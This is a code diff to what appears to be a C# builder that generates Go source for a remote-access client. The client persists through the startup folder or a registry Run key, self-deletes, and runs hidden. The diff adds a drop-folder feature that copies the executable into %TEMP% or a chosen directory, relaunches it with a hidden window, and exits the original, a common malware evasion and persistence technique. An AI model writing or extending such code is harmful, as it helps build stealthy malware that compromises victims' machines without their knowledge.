@@ -29,13 +29,14 @@ golang.org/x/tools v0.22.0 h1:gqSGLZqv+AI9lIQzniJ0nZDRG5GBPsSi+DRNHWNz6yA=
 golang.org/x/tools v0.22.0/go.mod h1:aCwcsjqvq7Yqt6TNyX7QMU2enbQ/Gt0bo6krSeEri+c=";
         }
 
-        public static string GetClientCode(string[] ipList, string[] rawList, string clientTag, string securityMode, string pinnedFingerprint, int startupMode)
+        public static string GetClientCode(string[] ipList, string[] rawList, string clientTag, string securityMode, string pinnedFingerprint, int startupMode, string? dropDirectory)
         {
             string ipAddresses = string.Join(", ", Array.ConvertAll(ipList, ip => $"\"{EscapeGoString(ip)}\""));
             string raws = string.Join(", ", Array.ConvertAll(rawList, raw => $"\"{EscapeGoString(raw)}\""));
             string tag = EscapeGoString(string.IsNullOrWhiteSpace(clientTag) ? "KryakClient" : clientTag.Trim());
             string mode = EscapeGoString(string.IsNullOrWhiteSpace(securityMode) ? "insecure" : securityMode.Trim().ToLowerInvariant());
             string pinned = EscapeGoString(NormalizeFingerprint(pinnedFingerprint));
+            string drop = EscapeGoString(dropDirectory ?? string.Empty);
 
             string src = $@"
 package main
@@ -241,6 +242,7 @@ func main() {{
     ipList := []string{{{ipAddresses}}}
     rawList := []string{{{raws}}}
     startupMode := {startupMode}
+    drop := ""{drop}""
     ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
     defer stop()
 
@@ -265,6 +267,9 @@ func main() {{
         moveToStartupFolder(true)
     case 3:
         addToRegistryRun()
+    }}
+    if drop != """" {{
+        moveToDropFolder(drop)
     }}
 
     <-ctx.Done()
@@ -689,6 +694,46 @@ func addToRegistryRun() {{
     addCmd := exec.Command(""reg"", ""add"", runKey, ""/v"", valueName, ""/t"", ""REG_SZ"", ""/d"", exePath, ""/f"")
     addCmd.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
     addCmd.Run()
+}}
+
+func moveToDropFolder(dropDir string) {{
+    exePath, err := os.Executable()
+    if err != nil {{
+        return
+    }}
+
+    base := strings.TrimSpace(dropDir)
+    if base == """" {{
+        base = ""%TEMP%""
+    }}
+    if strings.HasPrefix(base, ""%"") && strings.HasSuffix(base, ""%"") {{
+        env := strings.Trim(base, ""%"")
+        if expanded := os.Getenv(env); expanded != """" {{
+            base = expanded
+        }}
+    }}
+
+    targetPath := filepath.Join(base, filepath.Base(exePath))
+    if strings.EqualFold(exePath, targetPath) {{
+        return
+    }}
+
+    data, err := os.ReadFile(exePath)
+    if err != nil {{
+        return
+    }}
+
+    if err := os.WriteFile(targetPath, data, 0755); err != nil {{
+        return
+    }}
+
+    cmd := exec.Command(targetPath)
+    cmd.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
+    if err := cmd.Start(); err != nil {{
+        return
+    }}
+
+    os.Exit(0)
 }}
 
 func scheduleSelfDelete() error {{
